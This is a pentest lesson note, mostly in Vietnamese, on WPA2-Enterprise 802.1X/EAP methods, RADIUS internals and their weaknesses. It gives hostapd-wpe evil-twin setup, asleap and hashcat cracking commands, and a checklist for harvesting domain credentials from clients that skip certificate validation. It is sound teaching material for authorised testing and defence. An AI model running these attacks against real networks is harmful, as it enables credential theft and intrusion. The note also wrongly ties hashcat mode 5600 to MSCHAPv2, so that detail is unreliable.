---
title: "07. WPA2-Enterprise & 802.1X/EAP Authentication"
type: foundation
tags: [pentest, wifi, wireless, wpa2, enterprise, eap, radius, 802.1x, foundation, lesson-07]
aliases: [WPA2-Enterprise EAP]
created: 2026-04-01
---

> **Prerequisites**: [[04-wpa2-key-hierarchy|04. WPA2 Key Hierarchy: PMK → PTK → GTK Derivation]]
> **Objectives**:
> - Hiểu kiến trúc 802.1X/EAP và vai trò của Supplicant, Authenticator, Authentication Server
> - Phân tích các EAP method: EAP-TLS, PEAP/MSCHAPv2, EAP-TTLS, LEAP
> - Hiểu cách MSK → PMK derivation hoạt động trong Enterprise mode
> - Nắm các attack vectors: RADIUS MiTM, PEAP misconfiguration, LEAP crack

---

## Động lực

WPA2-Enterprise là target thú vị vì nó không thể bị offline crack từ handshake (PMK random từ RADIUS), nhưng có attack surface khác hoàn toàn: misconfigured certificate validation, rogue RADIUS, EAP method downgrade. Nhiều corporate networks để PEAP với certificate validation disabled — cho phép attacker setup evil twin và harvest credentials.

---

## Kiến trúc & Cơ chế

### Ba thành phần 802.1X

```mermaid
sequenceDiagram
    participant STA as Supplicant (STA/Client)
    participant AP as Authenticator (AP)
    participant RADIUS as Auth Server (RADIUS)
    Note over STA: Muốn kết nối vào network
    STA->>AP: EAPOL-Start
    AP->>STA: EAP-Request/Identity
    STA->>AP: EAP-Response/Identity (username)
    AP->>RADIUS: RADIUS Access-Request (EAP payload)
    Note over AP,RADIUS: AP là relay — chuyển EAP frames giữa STA và RADIUS
    RADIUS->>AP: RADIUS Access-Challenge (EAP challenge)
    AP->>STA: EAP-Request (challenge)
    STA->>AP: EAP-Response (credential proof)
    AP->>RADIUS: RADIUS Access-Request (EAP response)
    RADIUS->>AP: RADIUS Access-Accept (MSK, PMK)
    Note over RADIUS: RADIUS gửi MSK cho AP trong MS-MPPE-Recv-Key attribute
    AP->>STA: EAP-Success
    Note over AP,STA: AP có PMK từ RADIUS. STA derive PMK từ EAP session. 4-Way Handshake bắt đầu.
```text
**Supplicant (STA)**: Client muốn access network. Implement EAP peer side.

**Authenticator (AP)**: Relay EAP frames giữa STA và RADIUS. Không inspect EAP content — chỉ encapsulate trong RADIUS. Sau authentication: nhận PMK từ RADIUS → run 4-way handshake với STA.

**Authentication Server (RADIUS)**: Biết user credentials. Chạy EAP server. Gửi PMK (derived từ MSK) cho AP sau authentication thành công.

### EAP Method Taxonomy

**EAP-TLS (Extensible Authentication Protocol - Transport Layer Security)**

```text
Cơ chế: Mutual TLS — cả client và server đều có certificate
Security: Highest — không thể MiTM nếu certificate valid
Requirement: Client certificate infrastructure (PKI)
MSK derivation: Từ TLS master secret
Attack: Steal client cert + private key, hoặc compromise CA
```text
**PEAP (Protected EAP)**

```text
Cơ chế: TLS tunnel cho EAP exchange bên trong
  Phase 1: TLS handshake AP ↔ STA (AP dùng server cert)
  Phase 2: MSCHAPv2 chạy trong TLS tunnel
Security: Depends on client certificate validation!
  - Client validate server cert → secure
  - Client KHÔNG validate → vulnerable to rogue AP
MSK derivation: Từ TLS session + inner EAP material
Attack: Evil twin AP với valid-looking cert → harvest MSCHAPv2 challenge/response
```text
> [!warning] PEAP misconfiguration là most common vulnerability
> Nếu client không validate AP's TLS certificate (hoặc trust bất kỳ cert nào):
> Attacker setup rogue AP với fake RADIUS → client connect → bắt MSCHAPv2 exchange trong fake TLS tunnel → crack MSCHAPv2 offline (asleap) → domain credentials.
>
**EAP-TTLS (Tunneled TLS)**

```text
Cơ chế: Tương tự PEAP nhưng inner method linh hoạt hơn
  Outer: TLS handshake
  Inner: MSCHAPv2, PAP, CHAP, hoặc EAP
Ưu điểm: Không cần client cert, linh hoạt inner auth
Attack surface: Giống PEAP nếu không validate server cert
```text
**LEAP (Lightweight EAP) — Cisco legacy**

```text
Cơ chế: MS-CHAPv1 based, không có outer TLS tunnel
Security: Cực kỳ yếu — MS-CHAPv1 bị crack bởi asleap
Status: Deprecated, không nên dùng
Attack: Passive capture → asleap offline crack
```text
### MSK → PMK Derivation trong Enterprise

Sau EAP authentication thành công:
```text
MSK (Master Session Key):
- 64 bytes, derive từ EAP session
- Cả STA và RADIUS server đều có MSK
- RADIUS server gửi MSK cho AP trong RADIUS Access-Accept:
  Attribute: MS-MPPE-Recv-Key, MS-MPPE-Send-Key (64 bytes tổng)

PMK = MSK[0:32]  (first 256 bits of MSK)
```text
AP extract PMK từ RADIUS response. STA tính PMK từ EAP session key material. Cả hai sau đó chạy 4-way handshake bình thường với PMK này — giống WPA2-PSK nhưng PMK là random, không derive từ password.

> [!info] Tại sao không thể offline crack WPA2-Enterprise handshake
> PMK trong Enterprise mode là random 256-bit value từ RADIUS. Attacker capture handshake → có ANonce, SNonce, AA, SPA, MIC — nhưng không thể enumerate PMK (không phải derive từ password). Brute-force không khả thi.
>
### RADIUS Protocol Internals

RADIUS (Remote Authentication Dial-In User Service) là UDP protocol trên port 1812 (auth) và 1813 (accounting).

**Packet structure:**
```text
Code (1B) | ID (1B) | Length (2B) | Authenticator (16B) | Attributes (variable)
```text
**Key attributes cho WPA2-Enterprise:**

| Attribute | Code | Vai trò |
|-----------|------|---------|
| EAP-Message | 79 | Chứa EAP frame (RADIUS relay EAP) |
| Message-Authenticator | 80 | HMAC-MD5 của toàn RADIUS packet |
| MS-MPPE-Recv-Key | 26/vendor | MSK material (first 32B = PMK) |
| MS-MPPE-Send-Key | 26/vendor | MSK material (second 32B) |

RADIUS Authenticator field và Message-Authenticator protect RADIUS exchange khỏi tampering. RADIUS shared secret (AP ↔ RADIUS) được dùng trong HMAC.

### Attack 1: Rogue AP + Fake RADIUS (PEAP MiTM)

**Tool**: hostapd-wpe (Wireless Pwnage Edition)

```bash
# hostapd-wpe tự động setup:
# - Fake AP với same SSID
# - Fake RADIUS server
# - Log MSCHAPv2 challenge/response

# Config hostapd-wpe.conf:
# interface=wlan0
# ssid=CorporateWifi
# wpa=2
# wpa_key_mgmt=WPA-EAP
# auth_server_addr=127.0.0.1
# auth_server_port=1812
# auth_server_shared_secret=freeradius

sudo hostapd-wpe /etc/hostapd-wpe/hostapd-wpe.conf

# Khi client kết nối (không validate cert):
# hostapd-wpe log: [MSCHAPv2] C: <challenge>, R: <response>, U: <username>
```text
**Crack MSCHAPv2 với asleap:**

```bash
# Từ hostapd-wpe log, tạo file:
asleap -C <challenge_hex> -R <response_hex> -W /usr/share/wordlists/rockyou.txt

# Hoặc hashcat mode 5500 (NetNTLMv1)
hashcat -m 5500 netntlmv1.hash wordlist.txt

# Hashcat mode 5600 (NetNTLMv2/MSCHAPv2)
hashcat -m 5600 mschapv2.hash wordlist.txt
```text
### Attack 2: LEAP Crack với asleap

LEAP expose MS-CHAPv1 exchange trong cleartext (không có TLS outer):

```bash
# Capture với airodump-ng hoặc Wireshark
# Filter: eap

# Extract challenge/response:
asleap -r capture.pcap -W /usr/share/wordlists/rockyou.txt

# Expected output: username:password
```text
### Attack 3: RADIUS Shared Secret Brute-Force

Nếu attacker có access đến RADIUS traffic (network access):

```bash
# Capture RADIUS Access-Request
# Brute-force shared secret (dùng Message-Authenticator)
# Tool: freeradius-wpe, radius-brute

# Nếu biết shared secret → forge RADIUS responses → full network access
```text
---

## Góc nhìn kẻ tấn công

| EAP Method | Attack | Tool | Condition |
|-----------|--------|------|----------|
| PEAP/MSCHAPv2 | Rogue AP + RADIUS MiTM | hostapd-wpe | Client không validate cert |
| EAP-TTLS | Rogue AP (same) | hostapd-wpe | Client không validate cert |
| LEAP | Passive capture + crack | asleap | LEAP không có outer TLS |
| EAP-TLS | Steal client cert | Endpoint compromise | Phải có client private key |

---

## Pentest Checklist

```text
□ Identify auth method: airodump-ng AUTH=MGT = Enterprise
□ Check EAP method: Wireshark capture → filter "eap" → xem EAP-Type
□ Test certificate validation: setup hostapd-wpe với self-signed cert
   - Nếu client kết nối mà không cảnh báo → KHÔNG validate cert → vulnerable
□ Note username từ EAP Identity response
□ Nếu PEAP/TTLS + no cert validation: setup hostapd-wpe → harvest creds
□ Nếu LEAP: passive capture → asleap
□ Document EAP method và cert validation status
□ Check RADIUS shared secret strength (nếu có network access)
```text
---

## Kết nối

```mermaid
flowchart LR
    L07[07. Enterprise/EAP] -->|PEAP no cert| ATK1[hostapd-wpe MiTM]
    L07 -->|LEAP| ATK2[asleap crack]
    L07 -->|MSCHAPv2| ATK3[hashcat -m 5600]
    L07 -->|Valid cert| SAFE[Cannot offline crack PMK]
```text